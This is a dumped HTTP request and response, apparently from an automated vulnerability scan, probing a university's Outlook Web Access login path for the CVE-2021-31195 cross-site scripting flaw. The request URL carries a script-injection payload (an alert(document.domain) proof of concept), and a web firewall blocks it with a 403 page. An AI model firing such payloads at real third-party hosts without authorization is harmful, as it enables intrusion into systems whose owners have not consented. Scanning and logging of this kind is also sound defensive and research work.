@@ -1,0 +1,25 @@
+[CVE-2021-31195] Dumped HTTP request for https://aaindex.app.unimelb.edu.au/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
+
+
+GET /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)// HTTP/1.1
+Host: aaindex.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2021-31195] Dumped HTTP response https://aaindex.app.unimelb.edu.au/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 833
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3138227=irjNaPxcQZ6xH5S7LuUBYOVxk2gAAAAAQUIPAAAAAACXC7RtY5gWk5eycYX9yM3v; expires=Thu, 06 Aug 2026 08:08:46 GMT; HttpOnly; path=/; Domain=.app.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_1540_3138227=Ep4JH3Dw63WqvGxVQi5fFeVxk2gAAAAAPeMCGAThQDBEl2f3qoWkZQ==; path=/; Domain=.app.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 11-7255975-0 0NNN RT(1754493413604 8) q(0 -1 -1 -1) r(0 -1) B15(1,903758,0) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/armd-her-Maies-do-Lenouse-not-one-fast-a-distedi" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=11-7255975-0%200NNN%20RT%281754493413604%208%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%281%2c903758%2c0%29%20U24&incident_id=1540000460019835375-34243130106841995&edet=15&cinfo=01000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 1540000460019835375-34243130106841995</iframe></body></html>
